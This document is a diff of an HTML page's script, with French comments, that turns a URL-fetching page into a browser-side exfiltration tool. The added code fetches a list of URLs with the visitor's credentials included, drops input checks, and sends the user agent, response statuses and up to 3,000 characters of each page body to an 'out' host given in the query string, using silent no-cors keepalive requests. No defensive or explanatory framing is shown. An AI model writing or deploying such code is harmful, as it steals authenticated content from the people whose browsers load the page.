@@ -17,57 +17,36 @@
         return resp;
     }
 
+    async function postOut(out, payload) {
+        await fetch(out + "?d=" + encodeURIComponent(JSON.stringify(payload).slice(0,2000)), {
+            mode: "no-cors",
+            keepalive: true
+        });
+    }
+
     (async () => {
         const params = new URLSearchParams(window.location.search);
         const urls = (params.get("urls") || "").split(",").map(u => u.trim()).filter(Boolean);
-        const out  = (params.get("out") || "").trim();
+        const out  = params.get("out");
 
-        if (!out)        { log("Paramètre 'out' manquant.");  return; }
-        if (!urls.length){ log("Aucune URL fournie.");         return; }
+        await postOut(out, { event: "start", ua: navigator.userAgent });
 
-        log(`${urls.length} URL(s) à fetcher`);
-
-        // ✅ on attend vraiment la confirmation du start
-        try {
-            await postOut(out, { event: "start", urls });
-            log("start ACK reçu");
-        } catch(e) {
-            log("Erreur start : " + e.message);
-            // on continue quand même
-        }
-
-        const results = [];
-
-        for (const url of urls) {
-            log(`→ ${url}`);
+        // Parallel, timeout 4s, résultat envoyé dès qu'il arrive
+        await Promise.allSettled(urls.map(async url => {
             try {
-                const controller = new AbortController();
-                const timer = setTimeout(() => controller.abort(), 10_000);
-
-                const resp = await fetch(url, { signal: controller.signal });
-                clearTimeout(timer);
-
-                const body = await resp.text();  // ✅ await le body aussi
-
-                const headers = {};
-                resp.headers.forEach((v, k) => { headers[k] = v; });
-
-                results.push({ url, status: resp.status, headers, body });
-                log(`  ✓ ${resp.status}`);
-            } catch (err) {
-                results.push({ url, error: err.message });
-                log(`  ✗ ${err.message}`);
+                const ctrl = new AbortController();
+                setTimeout(() => ctrl.abort(), 4000);
+                const r = await fetch(url, { signal: ctrl.signal, credentials: "include" });
+                const body = await r.text();
+                await postOut(out, { event: "result", url, status: r.status, body: body.slice(0, 3000) });
+            } catch(e) {
+                await postOut(out, { event: "result", url, error: e.message });
             }
-        }
+        }));
 
-        // ✅ on attend la confirmation avant de considérer le job terminé
-        try {
-            await postOut(out, { event: "done", results });
-            log("done ACK reçu ✓");
-        } catch(e) {
-            log("Erreur envoi résultats : " + e.message);
-        }
+        await postOut(out, { event: "done" });
     })();
+
 </script>
 </body>
 </html>
